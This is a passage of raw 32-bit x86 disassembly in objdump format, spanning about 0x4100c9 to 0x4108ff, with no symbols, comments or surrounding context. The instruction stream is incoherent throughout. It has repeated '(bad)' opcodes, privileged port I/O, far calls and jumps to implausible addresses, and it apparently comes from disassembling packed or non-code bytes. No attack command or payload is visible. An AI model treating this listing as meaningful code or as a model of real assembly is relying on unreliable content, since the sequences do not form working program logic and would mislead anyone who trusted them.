  4100c9:	add    BYTE PTR [esp+ecx*2+0x7aa5ff00],ah
  4100d0:	out    0xa7,al
  4100d2:	ror    DWORD PTR [edx],0x0
  4100d5:	adc    DWORD PTR [esi+eax*1-0x1],0x75
  4100da:	sbb    bl,ah
  4100dc:	fs fs pop ecx
  4100df:	or     eax,0x65ec75ff
  4100e4:	xchg   edx,eax
  4100e5:	pop    ecx
  4100e6:	or     BYTE PTR [ebx],cl
  4100e8:	add    esp,0xfffffffc
  4100eb:	leave  
  4100ec:	jae    0x4100fa
  4100ee:	xor    ah,0x63
  4100f1:	inc    ecx
  4100f2:	fmul   st,st(1)
  4100f4:	jae    0x4100de
  4100f6:	lock mov dl,BYTE PTR [edi+0x0]
  4100fa:	enter  0xc28d,0xc
  4100fe:	scas   eax,DWORD PTR es:[edi]
  4100ff:	dec    BYTE PTR [edi]
  410101:	push   0x40e157
  410106:	scas   eax,DWORD PTR es:[edi]
  410107:	(bad)  
  410108:	jecxz  0x4100f2
  41010a:	push   ds
  41010b:	push   edx
  41010c:	add    BYTE PTR [eax],al
  41010e:	sbb    eax,ecx
  410110:	or     ch,BYTE PTR [edx-0x68]
  410113:	leave  
  410114:	jae    0x410112
  410116:	paddd  mm1,QWORD PTR [ebx]
  410119:	push   DWORD PTR ds:0x98414733
  41011f:	bound  edx,QWORD PTR [eax+esi*2-0x21]
  410123:	mov    DWORD PTR [edi-0x1917ffbb],0x72b5feff
  41012d:	std    
  41012e:	jne    0x41018c
  410130:	leave  
  410131:	xor    esi,DWORD PTR [esi-0x17ffb470]
  410137:	mov    dl,bh
  410139:	(bad)  
  41013a:	jmp    ecx
  41013c:	dec    ebp
  41013d:	fsubr  QWORD PTR [edx+0x58]
  410140:	leave  
  410141:	jae    0x410137
  410143:	xor    DWORD PTR [edi],ebx
  410145:	aaa    
  410146:	or     al,0x3e
  410148:	fnstsw WORD PTR [eax+0x47]
  41014b:	lock lahf 
  41014d:	stos   BYTE PTR es:[edi],al
  41014e:	sub    DWORD PTR [ecx+0x6c88bfb7],esp
  410154:	sbb    BYTE PTR [esi],ch
  410156:	add    BYTE PTR [esi],bl
  410158:	cmp    eax,0xd89cfeb3
  41015d:	mov    edi,0x42f7c734
  410162:	add    BYTE PTR [ecx],bl
  410164:	mov    ah,0x32
  410166:	(bad)  
  410167:	(bad)  
  410168:	sub    BYTE PTR [esi-0x2c],al
  41016b:	mov    esp,DWORD PTR [eax+0x76dd74bf]
  410171:	xor    eax,0x78b4e6e8
  410176:	inc    edi
  410177:	jo     0x410119
  410179:	stos   BYTE PTR es:[edi],al
  41017a:	std    
  41017b:	inc    esi
  41017c:	outs   dx,DWORD PTR ds:[esi]
  41017d:	mov    edi,0x8d707488
  410182:	inc    esp
  410183:	icebp  
  410184:	out    dx,eax
  410185:	shl    BYTE PTR [ebp+edx*8-0x7a],0x35
  41018a:	or     al,0x0
  41018c:	mov    dh,0x74
  41018e:	js     0x4101d7
  410190:	lock lahf 
  410192:	stos   BYTE PTR es:[edi],al
  410193:	in     eax,0x16
  410195:	aas    
  410196:	ror    BYTE PTR [eax+0x7c8393f4],0x91
  41019d:	lahf   
  41019e:	je     0x43a16a
  4101a4:	mov    dl,0xdc
  4101a6:	(bad)  
  4101a7:	jmp    FWORD PTR [edi]
  4101a9:	sub    al,0x6e
  4101ab:	push   DWORD PTR [esi-0x61]
  4101ae:	cmp    DWORD PTR [ecx+eax*4-0x61],0xf
  4101b3:	test   BYTE PTR [edx-0x53fffd61],dl
  4101b9:	ins    BYTE PTR es:[edi],dx
  4101ba:	(bad)  
  4101bb:	dec    edi
  4101bc:	push   esi
  4101bd:	or     BYTE PTR [edi+edx*8-0x3fe3a7aa],bl
  4101c4:	inc    edi
  4101c5:	add    DWORD PTR [ecx],ebp
  4101c7:	adc    BYTE PTR [ebp+0x3103e885],dh
  4101cd:	mov    al,BYTE PTR [ebx+0x65042ec7]
  4101d3:	xchg   BYTE PTR [esi],ah
  4101d5:	mov    ch,0xe8
  4101d7:	mov    ?,WORD PTR [ebp-0x3f]
  4101da:	cwde   
  4101db:	rcr    BYTE PTR [ebp+0xdf2d0d9],0xb5
  4101e2:	fisttp QWORD PTR [ebx]
  4101e4:	icebp  
  4101e5:	cmp    eax,0xc17d835c
  4101ea:	call   0xd9628826
  4101ef:	add    eax,DWORD PTR [eax]
  4101f1:	fidiv  WORD PTR [ebx-0x43]
  4101f4:	cmp    DWORD PTR [ecx],edi
  4101f6:	mov    eax,ds:0xb4de2cd3
  4101fb:	lods   eax,DWORD PTR ds:[esi]
  4101fc:	cmp    ecx,edx
  4101fe:	mov    ah,0x1b
  410200:	or     al,0xd9
  410202:	cmp    eax,0xb4c7bf10
  410207:	sbb    esp,eax
  410209:	mov    edi,0x49abe13e
  41020e:	and    al,BYTE PTR [esi-0x5ec15041]
  410214:	mov    edi,0x5e81011d
  410219:	or     BYTE PTR [ebp+ebp*2+0x65cd1dbf],dh
  410220:	cmp    DWORD PTR [ebp-0x4c],esp
  410223:	ror    DWORD PTR [ebx],cl
  410225:	cdq    
  410226:	in     eax,dx
  410227:	mov    edi,0xd3b47fbe
  41022c:	retf   
  41022d:	ja     0x41026d
  41022f:	sbb    DWORD PTR [edi+0x165100e5],edi
  410235:	fdiv   DWORD PTR [ebx+0x35b235ff]
  41023b:	int3   
  41023c:	jmp    0xa4c4205f
  410241:	jb     0x41024b
  410243:	jne    0x410233
  410245:	mov    ebx,0x4516cc4d
  41024a:	mov    bl,0x74
  41024c:	loope  0x4101d8
  41024e:	retf   
  41024f:	addr16 push es
  410251:	out    dx,al
  410252:	sahf   
  410253:	or     DWORD PTR [ebx+0x74b43200],edx
  410259:	loope  0x410225
  41025b:	outs   dx,BYTE PTR ds:[esi]
  41025c:	addr16 out dx,al
  41025e:	xlat   BYTE PTR ds:[ebx]
  41025f:	mov    dl,0x74
  410261:	in     eax,0xda
  410263:	or     DWORD PTR [esi+ebx*8-0x39],ebp
  410267:	mov    dl,0x74
  410269:	ror    edx,1
  41026b:	mov    cl,0x6a
  41026d:	into   
  41026e:	mov    bh,0xb2
  410270:	je     0x41022f
  410272:	call   0x74b2:0xa7be6ab9
  410279:	mov    ecx,0xae6aa18a
  41027e:	xchg   edi,eax
  41027f:	mov    dl,0x74
  410281:	xchg   ebp,eax
  410282:	call   0x74b2:0x879e6aa9
  410289:	or     DWORD PTR [edx+0x778e6ad1],0xda8d74b2
  410293:	fldcw  WORD PTR [edx+0x7e]
  410296:	out    0xb2,eax
  410298:	je     0x410223
  41029a:	retf   0x6ac1
  41029d:	outs   dx,BYTE PTR ds:[esi]
  41029e:	xlat   BYTE PTR ds:[ebx]
  41029f:	mov    dl,0x74
  4102a1:	inc    ebp
  4102a2:	fcmove st,st(1)
  4102a4:	push   0x5e
  4102a6:	(bad)  
  4102a7:	mov    dl,0x74
  4102a9:	xor    edx,ecx
  4102ab:	jno    0x410317
  4102ad:	dec    esi
  4102ae:	mov    bh,0xb2
  4102b0:	je     0x4102b2
  4102b2:	dec    esp
  4102b3:	pusha  
  4102b4:	mov    al,0x6b
  4102b6:	daa    
  4102b7:	jae    0x4102b6
  4102b9:	jne    0x4102bb
  4102bb:	cmp    BYTE PTR [eax-0x58],ah
  4102be:	imul   eax,DWORD PTR [edi],0x73
  4102c1:	std    
  4102c2:	jne    0x4102c8
  4102c4:	pusha  
  4102c5:	mov    al,ds:0xc773276b
  4102ca:	ret    0x754
  4102cd:	push   ebp
  4102ce:	mov    esi,DWORD PTR [edi+eax*4]
  4102d1:	ret    0x2fe8
  4102d4:	jne    0x4102d3
  4102d6:	(bad)  
  4102d7:	int    0x72
  4102d9:	dec    esi
  4102da:	call   FWORD PTR [ebp+0x5e35ff02]
  4102e0:	ds inc ecx
  4102e2:	add    al,ah
  4102e4:	cmp    dl,BYTE PTR [esi+0x0]
  4102e7:	sbb    BYTE PTR [edx],al
  4102e9:	ror    BYTE PTR [edi],0x8d
  4102ec:	adc    DWORD PTR [ecx],eax
  4102ee:	add    BYTE PTR [eax],cl
  4102f0:	into   
  4102f1:	inc    ebx
  4102f2:	clc    
  4102f3:	fadd   DWORD PTR [esi]
  4102f5:	add    BYTE PTR [eax],al
  4102f7:	(bad)
  4102fb:	iret   
  4102fc:	push   es
  4102fd:	add    BYTE PTR [edx-0x38],ch
  410300:	loopne 0x410301
  410302:	imul   ebx,eax,0xd8cffe0
  410308:	jno    0x410358
  41030a:	lea    ecx,[ebp+0x7d]
  41030d:	cmc    
  41030e:	jmp    DWORD PTR [edi-0x4f8a00a3]
  410314:	je     0x410389
  410316:	cld    
  410317:	ror    BYTE PTR [ebp+edx*2-0x3ffe7800],0x74
  41031f:	add    BYTE PTR [ebp-0x67ff2aa1],cl
  410325:	push   es
  410326:	push   0x47c092
  41032b:	push   DWORD PTR [ecx]
  41032d:	aad    0xe
  41032f:	call   0xfefc758d
  410334:	add    DWORD PTR [edi],esi
  410336:	aam    0x8c
  410338:	lods   al,BYTE PTR ds:[esi]
  410339:	lock mov ah,0xfe
  41033c:	pop    esi
  41033d:	nop
  41033e:	push   eax
  41033f:	call   0xfefc75ad
  410344:	mov    eax,0x46f6ac25
  410349:	adc    ebp,DWORD PTR [ebp+ebx*1-0x7342e536]
  410350:	in     al,dx
  410351:	andps  xmm5,XMMWORD PTR [eax+0x2e]
  410355:	jg     0x410398
  410357:	add    BYTE PTR [esi],ah
  410359:	std    
  41035a:	stos   DWORD PTR es:[edi],eax
  41035b:	neg    BYTE PTR [esi]
  41035d:	mov    ebx,0x67df34bb
  410362:	inc    ecx
  410363:	add    BYTE PTR [ecx],bl
  410365:	or     al,0x2e
  410367:	inc    DWORD PTR [esi]
  410369:	cmp    DWORD PTR [esi-0x4424f915],eax
  41036f:	xor    BYTE PTR [ebx+esi*2-0x6011014d],0x36
  410377:	pop    edx
  410378:	mov    dl,0xf4
  41037a:	mov    bl,0x3
  41037c:	fs jmp 0x7b06880a
  410382:	mov    ebx,0xcfce00fe
  410387:	mov    eax,DWORD PTR [ebp+edx*8-0x4f014466]
  41038e:	pop    esp
  41038f:	scas   eax,DWORD PTR es:[edi]
  410390:	div    BYTE PTR [esi+0x3102aa82]
  410396:	mov    al,ds:0x2c6e0a34
  41039b:	scas   eax,DWORD PTR es:[edi]
  41039c:	neg    BYTE PTR [esi+0x3102ab3a]
  4103a2:	mov    al,ds:0x88e19a7
  4103a7:	je     0x410358
  4103a9:	jg     0x41035c
  4103ab:	pop    ebp
  4103ac:	mov    esp,0xbc5da4c5
  4103b1:	ja     0x410364
  4103b3:	xchg   ebx,eax
  4103b4:	stos   DWORD PTR es:[edi],eax
  4103b5:	addr16 mov cl,0x45
  4103b8:	mov    esp,0x3b5100dd
  4103bd:	pop    ebp
  4103be:	mov    cl,0x35
  4103c0:	adc    BYTE PTR [ebp+0x4fbc35a4],0x8
  4103c7:	pushf  
  4103c8:	fiadd  WORD PTR [edi+0x7b]
  4103cb:	or     al,0xb4
  4103cd:	aas    
  4103ce:	mov    cl,0x0
  4103d0:	cwde   
  4103d1:	enter  0xdb1,0xbc
  4103d5:	in     eax,0x9d
  4103d7:	std    
  4103d8:	mov    ebx,0x2958a227
  4103dd:	push   ds
  4103de:	mov    cl,0xf5
  4103e0:	jne    0x4103f0
  4103e2:	mov    ecx,0x370fbbed
  4103e7:	icebp  
  4103e8:	stos   DWORD PTR es:[edi],eax
  4103e9:	add    BYTE PTR [edx],dl
  4103eb:	mov    al,0xdd
  4103ed:	mov    ebx,0xb3c076ff
  4103f2:	div    DWORD PTR [eax-0x4fa4cc40]
  4103f8:	lds    edi,FWORD PTR [ebx-0x40304e93]
  4103fe:	fdiv   QWORD PTR [eax-0x52a2444b]
  410404:	rcl    BYTE PTR [edi-0x3316f69c],0xf0
  41040b:	add    ecx,ebp
  41040d:	push   eax
  41040e:	stos   BYTE PTR es:[edi],al
  41040f:	popf   
  410410:	imul   eax,eax,0x2de923ba
  410416:	popa   
  410417:	mov    al,0xfb
  410419:	or     ebx,DWORD PTR [ecx-0x6044fa7e]
  41041f:	cmp    bh,0x2b
  410422:	fldcw  WORD PTR [eax]
  410424:	jmp    0xff49f833
  410429:	fdivr  QWORD PTR [edx]
  41042b:	mov    eax,ds:0xafba5fa2
  410430:	(bad)  
  410431:	fdivr  QWORD PTR [esi-0x651e8b51]
  410437:	jl     0x41049f
  410439:	inc    esi
  41043a:	stos   BYTE PTR es:[edi],al
  41043b:	rol    ecx,0xe5
  41043e:	xor    dl,BYTE PTR [esi-0x75]
  410441:	inc    ebp
  410442:	scas   al,BYTE PTR es:[edi]
  410443:	int3   
  410444:	sti    
  410445:	xchg   edi,eax
  410446:	jecxz  0x41046a
  410448:	add    BYTE PTR [ebx-0xe8b50c3],dl
  41044e:	add    BYTE PTR [edx+0x7a166756],cl
  410454:	add    DWORD PTR [ebp+ecx*1-0x42],0x6db139f4
  41045c:	or     DWORD PTR [ebx+0x414818bc],ecx
  410462:	jmp    0x7540f319
  410467:	jno    0x41048a
  410469:	call   0x47d1:0x57096c4d
  410470:	push   edi
  410471:	add    cl,ch
  410473:	daa    
  410474:	leave  
  410475:	jae    0x410465
  410477:	and    BYTE PTR [ecx-0x5155c53a],0x4f
  41047e:	push   ecx
  41047f:	xor    eax,0xa77ef09
  410484:	arpl   WORD PTR gs:[eax],bp
  410487:	xor    eax,0x351cff59
  41048c:	mov    eax,ds:0xae7b7bd2
  410491:	out    0xb5,eax
  410493:	add    eax,0x3582feb0
  410498:	inc    edi
  410499:	add    BYTE PTR [eax],0x6e
  41049c:	or     esi,DWORD PTR [ebp-0x6]
  41049f:	push   esi
  4104a0:	jno    0x4104d3
  4104a2:	shl    BYTE PTR [ecx+0x73],0xfd
  4104a6:	call   FWORD PTR [edi]
  4104a8:	jbe    0x410456
  4104aa:	cmp    BYTE PTR [edi+0x65ffbaf8],dl
  4104b0:	ja     0x4104af
  4104b2:	jne    0x4104b4
  4104b4:	nop
  4104b5:	arpl   WORD PTR [esi],si
  4104b7:	push   DWORD PTR [bp+si+0x5d]
  4104bb:	pop    esi
  4104bc:	and    esi,eax
  4104be:	add    al,BYTE PTR [eax]
  4104c0:	lds    edi,FWORD PTR [esi-0x16]
  4104c3:	add    DWORD PTR [esp+esi*2],0x51
  4104c7:	(bad)  
  4104c8:	xchg   ebp,eax
  4104c9:	jae    0x4104c9
  4104cb:	call   FWORD PTR [eax+0xb]
  4104ce:	mov    DWORD PTR [ebp+0x1c],0x4800000c
  4104d5:	jle    0x41051a
  4104d7:	or     al,0x9b
  4104d9:	mov    dl,0xfe
  4104db:	je     0x4104fe
  4104dd:	mov    al,ds:0x4f3a2bbe
  4104e2:	leave  
  4104e3:	ret    0xb0c
  4104e6:	mov    ebx,0xb1801
  4104eb:	jmp    0x410566
  4104ed:	test   BYTE PTR [ebx+0x10],bh
  4104f0:	or     bh,bl
  4104f2:	add    al,0x8b
  4104f4:	inc    ebp
  4104f5:	adc    eax,0xdeff1889
  4104fa:	or     edi,edi
  4104fc:	and    eax,0x7476e7fd
  410501:	jo     0x410500
  410503:	and    DWORD PTR [ebx-0x2efa8afe],0xffffffef
  41050a:	imul   ebx
  41050c:	push   ss
  41050d:	push   ebp
  41050e:	and    eax,0xfd709f7f
  410513:	or     DWORD PTR [ecx],esi
  410515:	fnstsw WORD PTR [ebx+0x20d80057]
  41051b:	add    al,0x0
  41051d:	xor    DWORD PTR [ebp+0x2362eb04],ebp
  410523:	mov    ebp,0x8bcd1c07
  410528:	inc    esp
  410529:	mov    DWORD PTR [ebx],ebp
  41052b:	dec    edi
  41052c:	cld    
  41052d:	ss jl  0x4104f5
  410530:	pop    es
  410531:	jo     0x410573
  410533:	or     al,0x89
  410535:	in     al,dx
  410536:	push   edi
  410537:	mov    edx,DWORD PTR [ebp+ebp*2+0x4b]
  41053b:	adc    eax,0x8d47ec8b
  410540:	push   esp
  410541:	pop    ebp
  410542:	lahf   
  410543:	pop    esi
  410544:	shr    DWORD PTR [esi],0xe1
  410547:	mov    ds:0xba65b806,eax
  41054c:	mov    ah,bl
  41054e:	jecxz  0x410594
  410550:	cmp    DWORD PTR [edx],0xffffffb9
  410553:	xor    BYTE PTR [edx-0x7cf9a256],bl
  410559:	imul   esp,DWORD PTR [eax-0x1fa5f9d3],0xa60ad1ec
  410563:	mov    eax,DWORD PTR [ecx+ebx*1+0x2b]
  410567:	dec    edi
  410568:	cld    
  410569:	push   0xffffffe9
  41056b:	lds    ecx,FWORD PTR [ebx]
  41056d:	xor    ebp,ebp
  41056f:	mov    ebx,gs
  410571:	mov    dl,0x63
  410573:	scas   al,BYTE PTR es:[edi]
  410574:	mov    al,ds:0x42267d
  410579:	sub    ch,ah
  41057b:	pop    es
  41057c:	jbe    0x41057e
  41057e:	das    
  41057f:	sbb    eax,esp
  410581:	enter  0xcff3,0x2
  410585:	call   FWORD PTR [esp+ebp*8]
  410588:	mov    DWORD PTR [eax+0x31],eax
  41058b:	enter  0x67b8,0xc6
  41058f:	or     BYTE PTR [esi+0x6bb1758a],ah
  410595:	ds mov ch,0x58
  410598:	cmp    esp,0xb88dae0e
  41059e:	sbb    eax,0x2d2e8615
  4105a3:	scas   al,BYTE PTR es:[edi]
  4105a4:	repz mov ebx,0xabe13397
  4105aa:	(bad)  
  4105ab:	sub    DWORD PTR [esi-0x48],ebp
  4105ae:	cmp    ecx,ecx
  4105b0:	cmc    
  4105b1:	jg     0x410587
  4105b3:	or     cl,ch
  4105b5:	add    esi,DWORD PTR [esi+0x33]
  4105b8:	in     eax,0xb8
  4105ba:	in     eax,0xb0
  4105bc:	dec    ebp
  4105bd:	cs mov al,gs:0xad5e225c
  4105c4:	jno    0x410604
  4105c6:	and    eax,0x3e13abf2
  4105cb:	mov    al,BYTE PTR [ebx+eax*1+0x2e260931]
  4105d2:	and    eax,0x490b93ae
  4105d7:	aas    
  4105d8:	mov    bh,BYTE PTR [eax-0x505c7cd1]
  4105de:	sbb    esi,DWORD PTR [esi]
  4105e0:	push   es
  4105e1:	inc    esi
  4105e2:	add    BYTE PTR ds:0x6d8c1ae1,ah
  4105e8:	mov    ch,0xfd
  4105ea:	fld    QWORD PTR [edx+0x3a03a77b]
  4105f0:	xlat   BYTE PTR ds:[ebx]
  4105f1:	pop    esp
  4105f2:	add    cl,BYTE PTR [edx]
  4105f4:	and    dl,BYTE PTR [ebx+0x4]
  4105f7:	popa   
  4105f8:	lods   al,BYTE PTR ds:[esi]
  4105f9:	pop    ebx
  4105fa:	or     al,0xd9
  4105fc:	or     eax,0xace7b749
  410601:	cmp    edx,DWORD PTR [eax]
  410603:	fidiv  WORD PTR [esi]
  410605:	icebp  
  410606:	stos   DWORD PTR es:[edi],eax
  410607:	cmp    BYTE PTR [eax],ch
  410609:	add    BYTE PTR [esi-0x2aab807a],dh
  41060f:	mov    bl,0xf2
  410611:	call   FWORD PTR [ebx]
  410613:	xor    esp,DWORD PTR [eax-0x4a8f8fb9]
  410619:	mov    ah,ah
  41061b:	pop    esi
  41061c:	jnp    0x41065e
  41061e:	jmp    0x1844a7d6
  410623:	out    0x35,al
  410625:	adc    al,0x18
  410627:	fidiv  WORD PTR ds:0x14076f8
  41062d:	call   0xfeed59d1
  410632:	shr    BYTE PTR [ebx],0xc9
  410635:	je     0x410622
  410637:	retf   
  410638:	in     eax,0x50
  41063a:	push   esi
  41063b:	and    BYTE PTR [ecx-0x5b612b02],dh
  410641:	adc    al,0xc8
  410643:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410644:	stos   DWORD PTR es:[edi],eax
  410645:	(bad)  
  410646:	mov    ah,0x0
  410648:	sahf   
  410649:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41064a:	or     cl,cl
  41064c:	xchg   DWORD PTR [ebx+0x4932e93c],ebp
  410652:	push   es
  410653:	lahf   
  410654:	xor    BYTE PTR [eax-0x4b0795f9],ah
  41065a:	call   FWORD PTR [ebx+0xe179fac]
  410660:	pusha  
  410661:	lods   eax,DWORD PTR ds:[esi]
  410662:	out    0x5a,eax
  410664:	xchg   BYTE PTR [esi+edi*8-0x528fda],ch
  41066b:	call   0xa4cc0fa2
  410670:	ss (bad) 
  410672:	(bad)  
  410673:	call   0xde410faa
  410678:	inc    ecx
  410679:	mov    cl,0xe7
  41067b:	aad    0x4f
  41067d:	lods   al,BYTE PTR ds:[esi]
  41067e:	(bad)  
  41067f:	bound  esi,QWORD PTR [ecx-0x53]
  410682:	enter  0x8a00,0x17
  410686:	add    BYTE PTR [ebp+0x63],dl
  410689:	fs push ebp
  41068b:	mov    ebx,DWORD PTR ds:0xd0c08301
  410691:	push   edi
  410692:	call   0xfdb53693
  410697:	mov    edx,DWORD PTR [eax+0x170c7372]
  41069d:	stos   DWORD PTR es:[edi],eax
  41069e:	std    
  41069f:	jne    0x410649
  4106a1:	add    BYTE PTR [ebp+0x4],0xb
  4106a5:	icebp  
  4106a6:	or     eax,DWORD PTR [eax]
  4106a8:	pushf  
  4106a9:	add    bh,bh
  4106ab:	jne    0x4106ad
  4106ad:	xchg   esp,eax
  4106ae:	add    BYTE PTR [ebp+0x8],0x28
  4106b2:	je     0x410727
  4106b4:	or     al,ah
  4106b6:	adc    al,0x68
  4106b8:	call   edi
  4106ba:	jle    0x4106ff
  4106bc:	adc    al,0xd1
  4106be:	scas   eax,DWORD PTR es:[edi]
  4106bf:	mov    dh,0x1
  4106c1:	pop    eax
  4106c2:	pop    es
  4106c3:	add    BYTE PTR [edi+0x21],bl
  4106c6:	retf   0xe
  4106c9:	mov    ebp,0x1c83ea7e
  4106ce:	pop    esp
  4106cf:	mov    DWORD PTR [ebp+0x5c],edx
  4106d2:	push   0x0
  4106d4:	add    BYTE PTR [eax+0x7],cl
  4106d7:	add    BYTE PTR [ebx],ch
  4106d9:	cli    
  4106da:	pop    edx
  4106db:	inc    ebx
  4106dc:	or     al,0x19
  4106de:	pop    es
  4106df:	add    BYTE PTR [eax],al
  4106e1:	pop    es
  4106e2:	jnp    0x4106a4
  4106e4:	xor    DWORD PTR [ebp-0x48afffe],0x73
  4106eb:	jae    0x410701
  4106ed:	mov    dl,0x7
  4106ef:	push   0x0
  4106f1:	mov    dl,0x6
  4106f3:	call   0xfdb61e88
  4106f8:	jmp    0x410e1e
  4106fd:	xor    DWORD PTR [edi],ebx
  4106ff:	aaa    
  410700:	or     al,0x30
  410702:	push   ebp
  410703:	loope  0x410703
  410705:	shl    BYTE PTR fs:[ebx+0x2fd82974],1
  41070c:	(bad)  
  41070d:	into   
  41070e:	jae    0x41069a
  410710:	inc    esp
  410711:	add    ch,al
  410713:	pop    ebx
  410714:	cs adc al,0x4b
  410717:	mov    al,ds:0xe5a40428
  41071c:	mov    bh,0x4f
  41071e:	cdq    
  41071f:	sti    
  410720:	mov    ah,0xfe
  410722:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410723:	mov    DWORD PTR [ebx],eax
  410725:	add    dh,BYTE PTR [ecx]
  410727:	mov    al,ds:0x9e257c7f
  41072c:	sub    eax,0x12ad8e23
  410731:	(bad)  
  410732:	cld    
  410733:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410734:	stos   BYTE PTR es:[edi],al
  410735:	sbb    eax,0x88b52313
  41073a:	in     al,dx
  41073b:	dec    ebx
  41073c:	mov    ch,0x74
  41073e:	inc    ebp
  41073f:	mov    BYTE PTR [edx],0x6a
  410742:	sub    eax,0x1fc3f4d
  410747:	pop    eax
  410748:	idiv   dh
  41074a:	push   esi
  41074b:	jmp    0x4106f7
  41074d:	(bad)  
  41074e:	xor    BYTE PTR [eax-0x343b7cfe],ah
  410754:	push   DWORD PTR [ecx+edx*1-0x1d]
  410758:	cs adc bl,cl
  41075b:	sahf   
  41075c:	mov    bl,0x74
  41075e:	cmp    DWORD PTR [eax],ecx
  410760:	dec    ecx
  410761:	bound  esp,QWORD PTR [esi]
  410763:	sti    
  410764:	mov    ah,0x74
  410766:	inc    ebp
  410767:	xchg   esi,eax
  410768:	jmp    FWORD PTR [ecx+0x31]
  41076b:	xchg   esi,eax
  41076c:	add    ch,al
  41076e:	sub    DWORD PTR [ebx-0xee7014d],esi
  410774:	add    al,BYTE PTR [eax]
  410776:	add    BYTE PTR [ecx],dh
  410778:	or     DWORD PTR [edx+0x36],ebp
  41077b:	and    eax,0xefe15405
  410780:	xor    edi,ecx
  410782:	mov    ah,0x5d
  410784:	add    ecx,eax
  410786:	pusha  
  410787:	push   ecx
  410788:	stos   BYTE PTR es:[edi],al
  410789:	lds    ecx,FWORD PTR [edx+0x2ebdad6d]
  41078f:	and    eax,0x2d29e91f
  410794:	jl     0x4107b9
  410796:	mov    eax,0xb595a16e
  41079b:	mov    bh,0xa9
  41079d:	(bad)  
  41079e:	mov    esi,DWORD PTR [ecx]
  4107a0:	or     ecx,ebp
  4107a2:	and    BYTE PTR ds:0x462ee3fd,0xaa
  4107a9:	sti    
  4107aa:	adc    ecx,DWORD PTR [ebx]
  4107ac:	add    edi,DWORD PTR [esi+0x2e]
  4107af:	cmp    DWORD PTR [ecx-0x5679dd8c],esp
  4107b5:	xor    BYTE PTR [edx],al
  4107b7:	xor    DWORD PTR [ecx],ecx
  4107b9:	jmp    0xe9491368
  4107be:	add    esi,DWORD PTR [edx-0x22021ad5]
  4107c4:	call   0x1f823616
  4107c9:	icebp  
  4107ca:	mov    ah,0xdd
  4107cc:	add    BYTE PTR [ecx-0x2c],dl
  4107cf:	shr    DWORD PTR [ecx+0x14bdb435],1
  4107d5:	ret    
  4107d6:	add    bl,cl
  4107d8:	or     BYTE PTR [ebx+0x5c490003],dl
  4107de:	push   ds
  4107df:	mov    ah,0x2f
  4107e1:	mov    bl,0xab
  4107e3:	add    dh,BYTE PTR [ecx]
  4107e5:	or     DWORD PTR [edx+0x36],ebp
  4107e8:	sub    eax,0x17e37c10
  4107ed:	pop    ds
  4107ee:	fldcw  WORD PTR [ecx]
  4107f0:	cmp    DWORD PTR [eax-0x4ec58401],ebp
  4107f6:	mov    eax,0xfea7c588
  4107fb:	pop    esp
  4107fc:	sbb    DWORD PTR [ebx],esi
  4107fe:	add    edx,DWORD PTR [ebx+0x35]
  410801:	xor    eax,DWORD PTR [eax]
  410803:	sar    DWORD PTR [ebx-0x4331015a],0x7
  41080a:	add    ecx,ebp
  41080c:	xor    cl,BYTE PTR [esp+edi*2+0x1c1dcaed]
  410813:	scas   al,BYTE PTR es:[edi]
  410814:	js     0x4107bb
  410816:	(bad)  
  410817:	call   0x1d40114e
  41081c:	sbb    DWORD PTR [ebx],esi
  41081e:	add    BYTE PTR [ebx],dl
  410820:	cmp    DWORD PTR [esi-0x4f026abc],edx
  410826:	arpl   WORD PTR [edi-0x7b17581e],cx
  41082c:	sub    eax,0x406a0009
  410831:	adc    eax,0xd036fc09
  410836:	inc    esp
  410837:	ins    DWORD PTR es:[edi],dx
  410838:	xor    al,0x9
  41083a:	add    cl,ch
  41083c:	ret    
  41083d:	sbb    eax,0x3200d314
  410842:	xor    eax,DWORD PTR [esp+eiz*2]
  410845:	clc    
  410846:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410847:	dec    edi
  410848:	inc    ecx
  410849:	mul    DWORD PTR [esi-0x3c4bb902]
  41084f:	(bad)  
  410850:	call   0xe5bd9487
  410855:	inc    esp
  410856:	sbb    eax,0x935710a
  41085b:	add    cl,ch
  41085d:	xchg   ebp,eax
  41085e:	sar    edi,cl
  410860:	call   0xe5bd9497
  410865:	daa    
  410866:	sbb    eax,0x935510a
  41086b:	add    BYTE PTR [eax],al
  41086d:	or     BYTE PTR [ebp+0xc1800b9],al
  410873:	cmp    DWORD PTR [ebp+0xc],0xffffffa8
  410877:	jo     0x4108ce
  410879:	adc    edi,DWORD PTR [esi-0x2676ae8e]
  41087f:	or     eax,DWORD PTR [eax]
  410881:	fmul   DWORD PTR [ebx+0x6]
  410884:	jae    0x410896
  410886:	pop    esp
  410887:	jae    0x410895
  410889:	jg     0x4108dc
  41088b:	hlt    
  41088c:	cmp    DWORD PTR [ebp+0x61],0xa
  410890:	sar    DWORD PTR [ebp+0x61],1
  410893:	std    
  410894:	jne    0x41081a
  410896:	cmp    edi,0x65
  410899:	(bad)  
  41089a:	pop    edx
  41089b:	xchg   DWORD PTR [ebp-0x70],eax
  41089e:	pop    edx
  41089f:	jae    0x4108b1
  4108a1:	iret   
  4108a2:	loopne 0x410897
  4108a4:	inc    DWORD PTR [eax]
  4108a6:	inc    ebp
  4108a7:	jne    0x4108a6
  4108a9:	jne    0x41083b
  4108ab:	sbb    DWORD PTR [edx+0x60],0xffffffaf
  4108af:	pop    edx
  4108b0:	std    
  4108b1:	jne    0x410917
  4108b3:	add    eax,0x5f85ff02
  4108b8:	std    
  4108b9:	jne    0x4108bb
  4108bb:	test   bh,cl
  4108bd:	std    
  4108be:	cvtdq2ps xmm7,xmm5
  4108c1:	jne    0x410893
  4108c3:	cmp    DWORD PTR [ebp+eiz*2+0x1b65aff],0x48
  4108cb:	or     eax,DWORD PTR [eax]
  4108cd:	jmp    0x410937
  4108cf:	mov    ?,WORD PTR [ebx+0xc]
  4108d2:	pop    ebp
  4108d3:	fst    QWORD PTR [ebx+ecx*1+0x2a]
  4108d7:	loope  0x410929
  4108d9:	or     DWORD PTR [ebp-0x77000159],0x4f487311
  4108e3:	loope  0x4108f0
  4108e5:	(bad)  
  4108e6:	xor    DWORD PTR [ebp-0x4a],esi
  4108e9:	or     BYTE PTR [esp+edi*8-0x5b7b2f01],0xb0
  4108f1:	je     0x4108f8
  4108f3:	stc    
  4108f4:	push   0x7aa00664
  4108f9:	inc    esp
  4108fa:	stc    
  4108fb:	mov    bh,0x36
  4108fd:	adc    dh,dh
  4108ff:	inc    ebp
